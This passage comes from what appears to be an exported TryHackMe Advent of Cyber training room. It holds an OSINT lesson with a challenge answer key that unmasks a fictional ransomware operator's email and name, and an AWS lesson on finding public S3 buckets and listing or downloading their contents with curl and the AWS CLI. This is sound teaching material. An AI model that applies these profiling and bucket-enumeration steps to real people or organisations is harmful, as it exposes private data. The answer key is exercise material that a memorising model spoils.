crucial to your investigation and lead you to what they're doing or pivot to another resource.<br /></td></tr><tr><td>Information from posts</td><td>Continuing from a target's post history, you can obtain various information from a target's posts. This can include location, other accounts, real name, interests, etc.<br /></td></tr></tbody></table><p>Account discovery can be difficult depending on the target's digital footprint and will depend on where you are within your OSINT process.<br /></p><p><span style=\"font-size:24px\">Google Dorking</span></p><p>To even begin searching for information, we need to first index and quickly find these sources. Luckily for us, Google is our best friend; unfortunately, a simple google search will not necessarily get us what we want or will not be as granular as we would like. Google has a known feature called \"google dorks\" that will allow you to use specific syntax in a search query to filter further and make your search more granular.</p><p><span style=\"color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt\">Google offers a defined list of key terms that we can leverage to reach our objectives. Below is a small list of possible key terms, a complete list of google dork terms can be found </span><a target=\"_blank\" href=\"https://www.sans.org/posters/google-hacking-and-defense-cheat-sheet/\" class=\"editor-rtfLink\">here</a><span style=\"color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt\"> or </span><a target=\"_blank\" href=\"https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06\" class=\"editor-rtfLink\">here</a><span style=\"color:rgb(14, 16, 26);background:transparent;margin-top:0pt;margin-bottom:0pt\">.</span><br /></p><table class=\"table table-bordered\" style=\"width:1076px\"><tbody><tr><td><span style=\"font-weight:bolder\">Term</span></td><td><span style=\"font-weight:bolder\">Purpose</span></td><td><span style=\"font-weight:bolder\">Example</span></td></tr><tr><td>site </td><td>Specifically searches that particular site and lists all the results for that site.<br /></td><td>site:\"<a href=\"http://www.google.com/\" class=\"notion-link-token notion-enable-hover\" target=\"_blank\"><span class=\"link-annotation-unknown-block-id--87748806\" style=\"border-bottom:0.05em solid rgba(55, 53, 47, 0.4);border-top-color:rgba(55, 53, 47, 0.4);border-right-color:rgba(55, 53, 47, 0.4);border-left-color:rgba(55, 53, 47, 0.4);opacity:0.7\">www.google.com</span></a>\"<br /></td></tr><tr><td>filetype</td><td>Searches for a particular filetype mentioned in the query.<br /></td><td>filetype:\"pdf\"<br /></td></tr><tr><td>link</td><td>Searches for external links to pages.<br /></td><td>link:\"keyword\"<br /></td></tr><tr><td>inurl</td><td>Searches for a URL matching one of the keywords.<br /></td><td>inurl:\"keyword\"<br /></td></tr><tr><td>before/after</td><td>Used to search within a particular date range.<br /></td><td>(before:2000-01-01 after:2001-01-01)<br /></td></tr></tbody></table><p><span style=\"font-size:24px\">OSINT &amp; The Blockchain</span></p><p>With the introduction of <a href=\"https://web3.foundation/\" target=\"_blank\">Web 3.0</a>, a decentralized web protocol set in its infancy, and the increased popularity in cryptocurrencies, OSINT from a <a href=\"https://www.investopedia.com/terms/b/blockchain.asp\" target=\"_blank\">blockchain technology</a> and decentralization perspective has become increasingly important. A core principle of blockchain technology and decentralization is anonymity. How can you gather information on a target if they are anonymous?<br /></p><p>Blockchain technology is completely open while remaining anonymous; this comes with its pros and cons from an OSINT perspective; we can quickly identify specific identifiers but linking them can become difficult. Multiple tools aid in exploring the blockchain, including but not limited to,<br /></p><ul><li>Blocktrail</li><li>Bitcoin Who's Who</li><li>Graphsense</li><li>Block Explorer</li></ul><p>We can apply the same methodology as previously discussed to blockchain technology. Although identifiers may be anonymous, that does not make them less unique or impossible to link to personas. When faced with blockchain technology, our end goal is to get back to a traditional persona. This process may change as the web changes but will stay the same for now with current technology.<br /></p><p></p><p>Objectives and methodologies will change as decentralization and blockchain technology change and adapt. Examples of this can already be seen with most cryptocurrency wallets rotating addresses and ensuring proper security measures and privacy.<br /></p><p><span style=\"font-size:24px\">Going Deeper</span></p><p>At its core, OSINT is searching and identifying information. However, we also need to look at how we can use platform functionality to our advantage to get further information and links that may still be publicly accessible but are not easily found.<br /></p><p>Each platform will have its unique functionality and \"tricks\" that can be used. It is essential to familiarize yourself with all of these platforms and understand their ins and outs. In this task, we will be focusing on GitHub specifically and some of the ways individuals may not be properly securing their private information.<br /></p><p>Previously we have discussed the idea of looking at a user's history to identify information. At first thought, it may seem that GitHub does not have a history we can leverage, but it indeed does. Version control is critical to GitHub's operation, but it can lead to potential information leaks when not adequately sanitized or monitored.<br /></p><p>An example of an unintentional information leak from GitHub could be a company that forgot to delete its API keys from a JSON file. They made a new commit to their repository with the thought that no one could access those keys anymore. Anyone can look at a public repository commit history and view exactly what was deleted and added to the repository.<img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/fcd94be34ed25de238ad3232606bd9c2.png\" style=\"text-align:center;font-size:1rem;width:100%\" /><br /></p><p><span style=\"font-size:24px\">Compiling an Investigation</span></p><p>The most daunting part of an OSINT investigation can be starting and putting all of the pieces together. There is no need to worry; you will almost always be given a starting point or some form of reference with which to begin. When trying to put pieces of an investigation together, it is important to remember that not everything may have a link, and there can be multiple pieces that go to one another don't focus on one thing too much and focus on creating a more general persona and understanding of what or who you are targeting.</p>","taskType":"none","taskNo":21,"taskCreated":"2021-11-16T13:45:30.550Z","taskDeadline":null,"tasksInfo":[{"question":"<img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/5ff2e00817ccacbef7b8d8fd02d5c757.png\" class=\"note-float-right\" style=\"float:right;width:165.453px\" /><p>You are the responding intelligence officer on the hunt for more information about the infamous \"Grinch Enterprises\" ransomware gang. <br />As a response to the recent ransomware activity from Grinch Enterprises, your team has managed to collect a sample ransomware note. </p><p>!!! ВАЖНЫЙ !!!</p><p>Ваши файлы были зашифрованы Гринчем. Мы используем самые современные технологии шифрования.</p><p>Чтобы получить доступ к своим файлам, обратитесь к оператору Grinch Enterprises.</p><p>Ваш личный идентификационный идентификатор: «b288b97e-665d-4105-a3b2-666da90db14b».</p><p>С оператором, назначенным для вашего дела, можно связаться как \"GrinchWho31\" на всех платформах.</p><p></p><p>!!! ВАЖНЫЙ !!!</p>","hint":"Use Google Translate to start your investigation.","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"},{"question":"<p>What is the operator's username?<br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":1,"submission":"GrinchWho31","noAnswer":false,"answerDesc":"Answer format: ***********"},{"question":"<p>What social media platform is the username associated with?<br /></p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":1,"submission":"Twitter","noAnswer":false,"answerDesc":"Answer format: *******"},{"question":"<p>What is the cryptographic identifier associated with the operator?<br /></p>","hint":"","questionNo":4,"correct":true,"extraPoints":0,"attempts":1,"submission":"1GW8QR7CWW3cpvVPGMCF5tZz4j96ncEgrVaR","noAnswer":false,"answerDesc":"Answer format: ************************************"},{"question":"<p>What platform is the cryptographic identifier associated with?<br /></p>","hint":"","questionNo":5,"correct":true,"extraPoints":0,"attempts":1,"submission":"keybase.io","noAnswer":false,"answerDesc":"Answer format: *******.**"},{"question":"<p>What is the bitcoin address of the operator?<br /></p>","hint":"","questionNo":6,"correct":true,"extraPoints":0,"attempts":1,"submission":"bc1q5q2w2x6yka5gchr89988p2c8w8nquem6tndw2f","noAnswer":false,"answerDesc":"Answer format: ******************************************"},{"question":"<p>What platform does the operator leak the bitcoin address on? <br /></p>","hint":"","questionNo":7,"correct":true,"extraPoints":0,"attempts":1,"submission":"GitHub","noAnswer":false,"answerDesc":"Answer format: ******"},{"question":"<p>What is the operator's personal email?<br /></p>","hint":"Don't forget to look at other repositories!","questionNo":8,"correct":true,"extraPoints":0,"attempts":1,"submission":"DonteHeath21@gmail.com","noAnswer":false,"answerDesc":"Answer format: ******************.***"},{"question":"<p>What is the operator's real name?<br /></p>","hint":"What if they deleted their real name from the file?","questionNo":9,"correct":true,"extraPoints":0,"attempts":1,"submission":"Donte Heath","noAnswer":false,"answerDesc":"Answer format: ***** *****"}],"uploadId":"","questions":[{"questionNo":1,"question":"<img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/5ff2e00817ccacbef7b8d8fd02d5c757.png\" class=\"note-float-right\" style=\"float:right;width:165.453px\" /><p>You are the responding intelligence officer on the hunt for more information about the infamous \"Grinch Enterprises\" ransomware gang. <br />As a response to the recent ransomware activity from Grinch Enterprises, your team has managed to collect a sample ransomware note. </p><p>!!! ВАЖНЫЙ !!!</p><p>Ваши файлы были зашифрованы Гринчем. Мы используем самые современные технологии шифрования.</p><p>Чтобы получить доступ к своим файлам, обратитесь к оператору Grinch Enterprises.</p><p>Ваш личный идентификационный идентификатор: «b288b97e-665d-4105-a3b2-666da90db14b».</p><p>С оператором, назначенным для вашего дела, можно связаться как \"GrinchWho31\" на всех платформах.</p><p></p><p>!!! ВАЖНЫЙ !!!</p>","hint":"Use Google Translate to start your investigation."},{"questionNo":2,"question":"<p>What is the operator's username?<br /></p>","hint":""},{"questionNo":3,"question":"<p>What social media platform is the username associated with?<br /></p>","hint":""},{"questionNo":4,"question":"<p>What is the cryptographic identifier associated with the operator?<br /></p>","hint":""},{"questionNo":5,"question":"<p>What platform is the cryptographic identifier associated with?<br /></p>","hint":""},{"questionNo":6,"question":"<p>What is the bitcoin address of the operator?<br /></p>","hint":""},{"questionNo":7,"question":"<p>What platform does the operator leak the bitcoin address on? <br /></p>","hint":""},{"questionNo":8,"question":"<p>What is the operator's personal email?<br /></p>","hint":"Don't forget to look at other repositories!"},{"questionNo":9,"question":"<p>What is the operator's real name?<br /></p>","hint":"What if they deleted their real name from the file?"}]},{"taskTitle":"[Day 17] <span class=\"badge badge-soft-purple size-16\">Cloud</span> Elf Leaks","taskDesc":"<p style=\"margin:0pt 45pt 0pt 31.5pt;line-height:1.38\">﻿﻿﻿﻿<img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/6145d05439d48b00410b94bc/room-content/a6e3f7b6af2769b78f69fc9eab2847bf.png\" class=\"note-float-left\" style=\"width:99px;float:left;height:134.021px\" /><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">In a move to taunt the Best Festival Company, Grinch Enterprises sends out an email to the entire company with everyone's name and date of birth. McSkidy looks quite stressed with the breach and thinks about the potential legal consequences. She talks to McInfra to try to determine the origin of the breach.</span></p><p style=\"margin:0pt 45pt 0pt 31.5pt;line-height:1.38;text-align:justify\"><span style=\"font-size:11pt;font-family:Avenir, sans-serif;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"><br /></span></p><p style=\"margin:0pt 45pt 0pt 31.5pt;line-height:1.38;text-align:justify\"><span style=\"font-size:11pt;font-family:Avenir, sans-serif;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"><br /></span></p><p style=\"margin:0pt 45pt 0pt 31.5pt;line-height:1.38;text-align:justify\"><span style=\"font-size:11pt;font-family:Avenir, sans-serif;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"><br /></span></p><p style=\"margin:0pt 45pt 0pt 31.5pt;line-height:1.38;text-align:justify\"><br /></p><h2><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;font-size:24px\"></span></h2><h2><span style=\"font-size:24px\">Check out Neal Bridge's walkthrough video for day 17 </span><a href=\"https://www.youtube.com/watch?v=RAgvdpvKJa0\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a><br /><br /></h2><h2><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;font-size:24px\">Shadow IT</span></h2><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Sometimes business units go around corporate IT, procurement, legal, and security when they need to get the job done quickly. This leads to security teams not knowing what they need to protect and systems not built to IT or Security standards. </span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Public Cloud is an easy way for business units to engage in shadow IT. And the most accessible public cloud to get started with is AWS.</span><img src=\"https://tryhackme.com/img/events/christmas/tree.png\" style=\"width:450px\" /><img src=\"https://s3.amazonaws.com/images.bestfestivalcompany.com/tree.png\" style=\"width:450px\" /></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><br /></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">What are the differences between these two images? (Hint: right-click and look at the image addresses)</span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">One of these is an external link from an Amazon S3 Bucket. </span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"><br /></span></p><h2><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;font-size:24px\">Getting Started</span></h2><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">You'll need to start your AttackBox to run commands using the AWS CLI for today's lesson. Your target will be an AWS account and some resources hosted by TryHackMe for this year's Advent of Cyber.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"><span style=\"font-weight:bolder\"><br /></span></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"><span style=\"font-weight:bolder\">Please note:</span> If you are on the TryHackMe free plan, the attack box does not have internet access and cannot reach AWS. You will need to install curl and the AWS CLI on your own machine in order to complete this challenge. Instructions for installing the AWS CLI are here: </span><a href=\"https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html\" target=\"_blank\">https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html</a><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"><a href=\"https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html\" target=\"_blank\"></a></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"><br /></span></p><h2><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;font-size:24px\">Today's Learning Objective</span></h2><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/6145d05439d48b00410b94bc/room-content/641b918d85f99177e9b22e2ce496b469.png\" class=\"note-float-right\" style=\"float:right;width:148.869px;height:89.3125px\" /><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Today we'll be covering the basics of AWS - one of the leading public cloud providers, and two of its most common services - </span><a href=\"https://aws.amazon.com/s3/\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;text-decoration-skip-ink:none;vertical-align:baseline\">Amazon S3 (Simple Storage Service)</span></a><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"> and </span><a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/introduction.html\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;text-decoration-skip-ink:none;vertical-align:baseline\">AWS IAM (Identity and Access Management</span></a><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">). </span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">We'll show you how to get started with the AWS CLI, then describe how to discover public S3 buckets, look at what's inside. We will also look at how you could leverage an IAM Access Key &amp; Secret.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"><br /></span></p><h2><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;font-size:24px\">Amazon AWS</span></h2><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Amazon AWS is a public cloud service provider. As of their most recent financial disclosures, AWS accounts for the bulk of Amazon's profit. Most major enterprises leverage AWS in some form or another for Compute Services, Big Data or Machine Learning, Data Archive, Video Streaming, IoT, etc. The number of services AWS supports is so vast that we can barely fit it all in this screenshot. </span><img src=\"https://s3.amazonaws.com/images.bestfestivalcompany.com/AWSConsole.png\" style=\"width:1076px\" /></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-size:1rem\"></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-size:1rem\">Your eyes don't deceive you. You can access robots, blockchain, satellites, and quantum computing from AWS. </span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-regions-availability-zones.html#concepts-available-regions\" target=\"_blank\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;text-decoration-skip-ink:none;vertical-align:baseline\">AWS divides its infrastructure into Regions</span></a><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">, mostly independent clusters of datacenters. Within each region are availability zones (AZ). Each AZ in a region leverages separate power grids and usually are located in different flood plains. This redundancy allows you to establish highly resilient architectures to withstand significant weather or geological events, or more frequently, hardware or facility failures. </span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"><br /></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Because regions are independent - you'll get different answers to questions depending on the region you are querying. You can specify a region with the</span><span style=\"font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"> </span><code style=\"font-size:14px\">--region</code><span style=\"font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"> </span><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">option to the AWS CLI.</span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">You can access AWS via the AWS Console, AWS CLI, AWS API, or the associated SDKs for your favorite programming languages. </span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"><br /></span></p><h2><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;font-size:24px\">Amazon S3</span></h2><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/6145d05439d48b00410b94bc/room-content/ee5e0b59d67f136f1b0f0ee582bec5e0.png\" class=\"note-float-right\" style=\"float:right\" /><a href=\"https://aws.amazon.com/s3/\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;text-decoration-skip-ink:none;vertical-align:baseline\">Amazon S3</span></a><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"> (Simple Storage Service) is their hosted object storage service. Objects are stored in Buckets. To highly simplify the concept of object storage, Buckets are key-value stores, with the Object Key being a full pathname for a file and the value being the contents of the file. S3 is a publicly hosted service - it doesn't exist behind a corporate firewall, making it convenient for hosting public content. AWS has an entire feature set around </span><a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide//WebsiteHosting.html\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;text-decoration-skip-ink:none;vertical-align:baseline\">hosting a public website in S3</span></a><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">.</span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">AWS Buckets use a global namespace. Only one AWS customer can create a bucket named</span><span style=\"font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"> </span><code style=\"font-size:14px\">bestfestivalcompany-images</code><span style=\"font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\">. </span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Amazon S3 is used for more than public hosting. It has many uses for data archive, video processing, regulatory record retention, etc. The challenge for Best Festival Company, like any enterprise using S3, is that sometimes data gets mixed up, and data that shouldn't be public gets made public.</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"><br /></span></p><h3><span style=\"font-size:18pt;font-family:Arial;color:rgb(67, 67, 67);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\">Discovering Bucket Names</span></h3><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">There are many ways to discover the names of Buckets. One of the easiest ways is when a company embeds content hosted in S3 on their website. Images, PDFs, etc., can all be hosted cheaply in S3 and linked from another site. These links will look like this: </span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38;margin-left:36pt\"><code style=\"font-size:14px\">http://BUCKETNAME.s3.amazonaws.com/FILENAME.ext</code><span style=\"font-size:11pt;font-family:&quot;Courier New&quot;;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"> </span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">or</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38;margin-left:36pt\"><code style=\"font-size:14px\">http://s3.amazonaws.com/BUCKETNAME/FILENAME.ext</code><span style=\"font-size:11pt;font-family:&quot;Courier New&quot;;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">In both these cases, it is easy to identify the name of the S3 bucket. Now, what can we do with that information?</span></p><h3><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;font-size:18px\">Listing the Contents of Buckets</span></h3><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Amazon S3 is one of AWS's oldest services. It's so old that it has two different methods of access control: </span><a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-policies.html\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;text-decoration-skip-ink:none;vertical-align:baseline\">Bucket Policies</span></a><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"> and </span><a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/managing-acls.html\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;text-decoration-skip-ink:none;vertical-align:baseline\">S3 ACLs</span></a><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">. This leads to great confusion for developers who must manage policies, ACLs, and the differences between </span><a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#specifying-grantee-predefined-groups\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;text-decoration-skip-ink:none;vertical-align:baseline\">Any User and Authenticated Users</span></a><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">. </span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Many buckets that contain public information allow you to list the contents of the bucket. In your AttackBox, try running the command: </span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><code style=\"font-size:14px\">curl http://irs-form-990.s3.amazonaws.com/</code><span style=\"text-indent:36pt;background-color:transparent;font-size:11pt;font-family:&quot;Courier New&quot;;color:rgb(0, 0, 0);font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"></span><a href=\"http://irs-form-990.s3.amazonaws.com/\"></a></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">That massive pile of XML</span><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"> is a listing of all the IRS Form 990 filings for US Tax-Exempt corporations. AWS makes this data available as a </span><a href=\"https://registry.opendata.aws/irs990/\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;text-decoration-skip-ink:none;vertical-align:baseline\">public dataset</span></a><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">.</span></p><br /><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">If mentally parsing XML that contains no line breaks isn't your cup of tea, the AWS CLI also provides the ability to list the contents of a bucket (You probably want to hit Ctrl-C after a few seconds, there are a lot of US non-profit organizations). </span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><code style=\"font-size:14px\">aws s3 ls s3://irs-form-990/ --no-sign-request</code><span style=\"background-color:transparent;color:rgb(0, 0, 0);font-family:&quot;Courier New&quot;;font-size:11pt;text-indent:36pt;white-space:pre-wrap\"></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38;text-indent:36pt\"><span style=\"font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"><br /></span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">The option</span><span style=\"font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"> </span><code style=\"font-size:14px\">--no-sign-request</code><span style=\"font-size:11pt;font-family:&quot;Courier New&quot;;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"></span><span style=\"font-size:11pt;font-family:Arial;color:rgb(0, 0, 0);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"> </span><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">allows you to request data from S3 without being an AWS Customer. </span></p><h3><span style=\"font-size:14pt;font-family:Arial;color:rgb(67, 67, 67);background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\">Downloading Objects</span></h3><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Downloading an object from S3 is also easy. You can use curl:</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><code style=\"font-size:14px\">curl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml</code><span style=\"text-indent:36pt;background-color:transparent;font-size:11pt;font-family:&quot;Courier New&quot;;color:rgb(0, 0, 0);font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;white-space:pre-wrap\"></span><a href=\"http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml\"></a></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">or the AWS CLI:</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><code style=\"font-size:14px\">aws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request</code><span style=\"background-color:transparent;font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline;font-size:14.6667px;white-space:pre-wrap\">\n</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">Note the two different URIs for an object. Objects can be addressed with http:// or via s3://</span></p><p style=\"margin-top:0pt;margin-bottom:0pt;line-height:1.38\"><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\"><br /></span></p><h3><span style=\"font-variant-numeric:normal;font-variant-east-asian:normal;vertical-align:baseline\">The different levels 